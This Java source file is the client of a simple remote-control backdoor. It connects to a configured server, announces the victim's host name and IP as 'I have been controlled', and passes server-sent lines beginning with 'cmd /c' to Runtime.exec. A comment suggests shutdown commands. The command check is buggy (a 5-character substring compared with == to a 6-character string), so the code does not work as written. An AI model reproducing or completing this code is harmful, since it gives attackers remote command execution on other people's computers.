/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package connectclient;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;

/**
 *
 * @author wy521
 */
public class ClientOperate {

    Socket socket;
    InetAddress address;
    OutputStream os;
    PrintWriter pw;
    InputStream is;
    InputStreamReader isr;
    BufferedReader br;

    /**
     * 客户端主界面
     *
     * @throws IOException
     */
    public ClientOperate() throws IOException {
        socket = new Socket(ClientInformation.IP, ClientInformation.Port);
        os = socket.getOutputStream();//字节输出流
        pw = new PrintWriter(os);//将输出流包装成打印流
        address = InetAddress.getLocalHost();
        String computer = address.getHostName();//获取计算机名
        String ip = address.getHostAddress();//获取IP地址
        pw.write("我是 ：" + computer + "    " + ip + "  我已经被控制");
        pw.flush();
    }

    /**
     * 发送文字
     *
     * @param text 即将要发送的文字
     * @throws IOException 可能会抛出的异常
     */
    public void sendToServer(String text) throws IOException {
        OutputStream os = socket.getOutputStream();
        PrintWriter pw = new PrintWriter(os);
        pw.write(text);
        pw.flush();
    }

    /**
     * 接收来自服务端的文字
     *
     * @return 返回接收的文字
     * @throws IOException 可能会抛出的异常
     */
    public String receiveFromServer() throws IOException {
        is = socket.getInputStream();
        isr = new InputStreamReader(is);
        br = new BufferedReader(isr);
        String info = null;
        while ((info = br.readLine()) != null) {
            if (info.substring(0, 5) == "cmd /c") {
                try {
                    Process pro = Runtime.getRuntime().exec(info); //添加要进行的命令，"cmd  /c calc"中calc代表要执行打开计算器，如何设置关机请自己查找cmd命令
                } catch (IOException exception) {
                }
            } else {
                return info;
            }

        }
        return "";
    }

    /**
     * 关闭连接
     *
     * @throws IOException 可能会抛出的异常
     */
    public void close() throws IOException {
        //4、关闭资源
        br.close();
        is.close();
        pw.close();
        os.close();
        socket.close();
    }
}
